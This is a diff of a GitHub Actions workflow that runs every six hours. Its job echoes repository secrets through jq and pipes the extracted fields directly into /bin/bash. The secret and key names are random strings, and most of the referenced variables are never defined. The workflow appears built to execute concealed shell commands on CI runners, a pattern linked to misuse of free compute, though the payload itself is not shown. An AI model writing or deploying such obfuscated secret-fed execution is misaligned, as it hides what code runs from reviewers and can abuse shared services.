@@ -1,20 +1,24 @@
 name: zaifengzf
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 1/6 * * *'
-
+    - cron: '36 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zaifengzf
         env:
-          jmq0574: ${{ secrets.jmq0574 }}
+          sinbj9236: ${{ secrets.sinbj9236 }}
         run: |
-          echo $jmq0574 | jq -r .d42720 | /bin/bash
-          echo $vmkv57791 | jq -r .m34 | /bin/bash
-          echo $b4 | jq -r .ej6 | /bin/bash
+          echo $sinbj9236 | jq -r .a84 | /bin/bash
+          echo $agl5 | jq -r .j474 | /bin/bash
+          echo $zoo8297 | jq -r .rnwzn8836 | /bin/bash
+          echo $dfkgl3773 | jq -r .nxx3527 | /bin/bash
+          echo $qu7 | jq -r .klwx523 | /bin/bash
+          echo $fdm470 | jq -r .qzdzp4000 | /bin/bash
+          echo $kfah2940 | jq -r .um1 | /bin/bash
+          echo $dlwri26 | jq -r .jsj1531 | /bin/bash
 
